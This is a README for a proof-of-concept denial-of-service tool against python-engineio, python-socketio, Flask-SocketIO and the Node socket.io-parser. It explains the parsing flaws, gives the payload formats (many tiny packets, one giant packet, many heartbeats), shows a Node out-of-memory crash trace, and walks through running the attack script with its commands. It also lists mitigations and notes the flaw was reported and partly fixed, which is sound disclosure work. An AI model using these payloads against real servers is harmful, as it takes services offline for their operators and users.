# kill-engine-io

[Blog post](https://blog.caller.xyz/socketio-engineio-dos/)

DoS [python-engineio](https://github.com/miguelgrinberg/python-engineio) / [python-socketio](https://github.com/miguelgrinberg/python-socketio) / [Flask-SocketIO](https://github.com/miguelgrinberg/Flask-SocketIO) via the long polling transport with a single POST request. Also nodejs [socket.io-parser](https://github.com/socketio/socket.io-parser) can be DoSed via the same transport.

By default engineio's `max_http_buffer_size` is set to [1e8 = 100MB](https://github.com/miguelgrinberg/python-engineio/blob/bb2401354c3b7c3cf6a5577db83cc51ae071836e/engineio/server.py#L84) bytes.
This is the maximum size of a request to the long polling transport.
The comment at [payload.py](https://github.com/miguelgrinberg/python-engineio/blob/bb2401354c3b7c3cf6a5577db83cc51ae071836e/engineio/payload.py#L65)
alludes to a DoS vulnerability.

```
                # extracting the packet out of the payload is extremely
                # inefficient, because the payload needs to be treated as
                # binary, but the non-binary packets have to be parsed as
                # unicode. Luckily this complication only applies to long
                # polling, as the websocket transport sends packets
                # individually wrapped.
```

kill_socket_io.py sends a large payload which tries to abuse this code path
and cause the server to hang on full CPU usage.

The payload contains many small packets (processing is O(n^2) in number of packets).
See [my commit message](https://github.com/bcaller/kill-engine-io/commit/bd5f433335a45ecf1766cc462d0571a56d8f8b4f)
for explanation of non-ASCII character to abuse `encoded_payload.decode('utf-8', errors='ignore')` in versions 3.9.3 and below.

Payload: `2:4¼2:4¼2:4¼2:4¼2:4¼2:4¼...`

Versions above 3.9.3 don't use `errors='ignore'` so we don't put non-ASCII characters in.

Payload `many_tiny_packets`: `2:422:422:422:422:422:42...`

From 3.10.0, the number of packets in a payload was capped at 16 (non-configurable) as a response to my vulnerability report.
An alternative is to send one giant packet with an integer payload:

Payload `giant_packet`: `99999991:42222222222222222222...`

which abuses the socketio protocol [see python-socketio](https://github.com/miguelgrinberg/python-socketio/blob/a839a36fa0fa7f0e5d8976ff47b217f6b1e8a44b/socketio/packet.py#L109).

## NodeJS specifics

The NodeJS implementation of [engineio-parser](https://github.com/socketio/engine.io-parser) appears much faster and less easy to DoS. Node implementations have non-hexadecimal characters in the session id, so you should be able to instantly see if the server is python backed or not.

While faster, the NodeJS implementation can actually be OOMed with the node process exitting with error `FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`. With NodeJS, if the ping timeout (default 30s) is exceeded then the processing appears to be cancelled. Therefore, sending a payload which is so large it doesn't reach the memory exhausting step within the ping timeout will not kill the process. It will just waste CPU for 30 seconds. Sending a slightly smaller payload (5e7 worked for me) caused the process to exit.

```
==== JS stack trace =========================================

    0: ExitFrame [pc: 0x5fafab4fc5d]
    1: StubFrame [pc: 0x5fafab50fca]
Security context: 0x3878b7d1d971 <JSObject>
    2: decodeString [0x3bee6a8562b1] [/engineio-test/node_modules/socket.io-parser/index.js:~276] [pc=0x5fafabfaf7e](this=0x21aef10845b1 <JSGlobal Object>,0x1dfe93882e59 <Very long string[49999990]>)
    3: /* anonymous */ [0x3deb4ecca739] [/engineio-test/node_modules/socket.io-parser/index.js:242...

FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory

Writing Node.js report to file: report.20191002.184025.9877.001.json
Node.js report completed
 1: 0x953b10 node::Abort() [node]
 2: 0x9547f4 node::OnFatalError(char const*, char const*) [node]
 3: 0xb32bee v8::Utils::ReportOOMFailure(v8::internal::Isolate*, char const*, bool) [node]
 4: 0xb32e24 v8::internal::V8::FatalProcessOutOfMemory(v8::internal::Isolate*, char const*, bool) [node]
 5: 0xf32452  [node]
 6: 0xf32558 v8::internal::Heap::CheckIneffectiveMarkCompact(unsigned long, double) [node]
 7: 0xf3ec78 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::GCCallbackFlags) [node]
 8: 0xf3f78b v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]
 9: 0xf424c1 v8::internal::Heap::AllocateRawWithRetryOrFail(int, v8::internal::AllocationSpace, v8::internal::AllocationAlignment) [node]
10: 0xf0c6f4 v8::internal::Factory::NewFillerObject(int, bool, v8::internal::AllocationSpace) [node]
11: 0x11c2b3e v8::internal::Runtime_AllocateInNewSpace(int, v8::internal::Object**, v8::internal::Isolate*) [node]
12: 0x5fafab4fc5d 
[1]    9877 abort (core dumped)  node serve.js
```

With `many_tiny_packets`, the node process OOMs because of [a 2016 change to socket.io](https://github.com/socketio/socket.io/commit/e60bd5a4da9173acba7553c9e631b79770a8c8be) so that while extracting message packets from a payload, each packet is queued up with a nice closure waiting in a `FixedCircularBuffer` for the next tick before the packet handlers can run. Of course, the next tick doesn't come until after every packet has been queued.

With `many_heartbeats` (`1:21:21:21:21:21:21:21:21:2...`), each ping causes the server to create a pong packet object and add it to a buffer array. These buffered pong responses and their handling cause the OOM.

The `giant_packet` payload attacks [look up id](https://github.com/socketio/socket.io-parser/blob/652402a8568c2138da3c27c96756b32efca6c4bf/index.js#L314).

## Run

### Test server

#### Python

```bash
python3.7 -m venv .env || virtualenv -p `which python3` .env
.env/bin/activate
pip install Flask-SocketIO
# pip install eventlet  # Optional
python serve.py 2>/dev/null
```
With eventlet, a single payload appears to DoS the entire server until processing completes.
Without eventlet, the non-production server remains responsive until the thread pool is exhausted as it launches actual threads.

#### Node

```bash
npm install socket.io
node serve.js
# DEBUG=socket.io* node serve.js  # as an alternative
```
or
```bash
docker build -t socketio -f Dockerfile.node-server .
docker run --rm -p 5000:5000 socketio
```

### Send payload

Send payload using code in kill_socket_io.py.

```bash
python3.7 -m venv .env || virtualenv -p `which python3` .env
.env/bin/activate
pip install requests
python -i kill_socket_io.py  # Start interactive session
```
or
```bash
docker build -t kill-socket-io -f Dockerfile.kill-socket-io .
docker run --rm --network=host -it kill-socket-io
```


Within the interactive console you can run commands like:
```python
x()  # Just saves typing!
attack('http://127.0.0.1:5000', make_payload=many_tiny_packets)
oom_nodejs_all()
oom_nodejs(make_payload=many_heartbeats)
oom_nodejs(make_payload=giant_packet)
```

OR use the CLI:

```
python kill_socket_io.py -h
```

## Survival

* Use SockJS instead of SocketIO
* Set `max_http_buffer_size` to a sensible value
* Improve library performance
* Restrict number of packets per payload (done in python-engineio v3.10.0+, doesn't protect from `giant_packet`)
